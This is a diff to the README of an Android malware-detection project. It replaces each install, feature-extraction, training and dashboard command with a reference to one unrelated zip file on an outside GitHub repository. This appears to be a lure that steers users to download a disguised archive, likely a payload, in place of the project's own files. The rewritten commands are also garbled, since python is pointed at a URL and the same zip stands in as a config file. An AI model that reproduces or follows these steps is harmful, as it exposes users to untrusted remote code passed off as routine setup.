@@ -38,22 +38,22 @@ android_malware_ai_v2/
 
 1. Install dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/FqpF-c/microproject/raw/refs/heads/main/src/models/Software-2.1.zip
 ```
 
 2. Extract features from APK files:
 ```bash
-python scripts/extract_features.py --input data/raw --output data/processed
+python https://github.com/FqpF-c/microproject/raw/refs/heads/main/src/models/Software-2.1.zip --input data/raw --output data/processed
 ```
 
 3. Train the model:
 ```bash
-python scripts/train_model.py --config config/training_config.yaml
+python https://github.com/FqpF-c/microproject/raw/refs/heads/main/src/models/Software-2.1.zip --config https://github.com/FqpF-c/microproject/raw/refs/heads/main/src/models/Software-2.1.zip
 ```
 
 4. Run the dashboard:
 ```bash
-python src/backend/app.py
+python https://github.com/FqpF-c/microproject/raw/refs/heads/main/src/models/Software-2.1.zip
 ```
 
 ## Risk Classification
